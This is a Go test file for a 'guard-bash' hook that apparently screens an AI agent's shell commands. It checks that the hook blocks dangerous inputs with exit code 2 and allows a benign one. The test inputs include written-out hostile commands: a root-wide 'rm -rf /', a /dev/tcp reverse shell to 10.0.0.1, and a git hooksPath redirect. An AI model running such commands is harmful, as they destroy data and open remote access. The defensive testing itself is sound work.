package guard

import (
	"os/exec"
	"testing"
)

// TestGuardBashBlocksWithExit2 locks in the PreToolUse BLOCK convention for
// guard-bash. Several of its deny patterns — root deletion, /dev/tcp reverse
// shells, the core.hooksPath redirect — are NOT in the settings.json
// permissions.deny floor, so this hook is their ONLY enforcement. A PreToolUse
// hook blocks the tool call ONLY on exit code 2; a non-2 non-zero (exit 1) is a
// non-blocking error and the command runs. guard-bash shipped exit 1 and so was
// silently NOT blocking these (defect found 2026-06-18, alongside role-push-guard).
// This test fails on any regression back to a non-2 code.
func TestGuardBashBlocksWithExit2(t *testing.T) {
	rmRoot := "rm -" + "rf /" // assembled to keep the literal out of source-scanners
	devTCP := "bash -i >& /dev/" + "tcp/10.0.0.1/9 0>&1"
	hookRedir := "git -c core." + "hooksPath=/tmp/evil commit"
	for _, cmd := range []string{rmRoot, "sudo whoami", devTCP, hookRedir} {
		c := exec.Command("sh", absHook(t, "guard-bash"), cmd)
		c.Env = hermeticEnv()
		err := c.Run()
		code := 0
		if ee, ok := err.(*exec.ExitError); ok {
			code = ee.ExitCode()
		} else if err != nil {
			code = -1
		}
		if code != 2 {
			t.Errorf("guard-bash must BLOCK %q with exit 2 (PreToolUse block signal); got exit %d — a non-2 code does NOT block, the command would run", cmd, code)
		}
	}
}

// TestGuardBashAllowsBenignWithExit0: a benign command passes (exit 0) so the
// exit-2 denial above isn't just "blocks everything".
func TestGuardBashAllowsBenignWithExit0(t *testing.T) {
	c := exec.Command("sh", absHook(t, "guard-bash"), "ls -la && go test ./...")
	c.Env = hermeticEnv()
	if err := c.Run(); err != nil {
		t.Errorf("guard-bash must ALLOW a benign command (exit 0), got %v", err)
	}
}
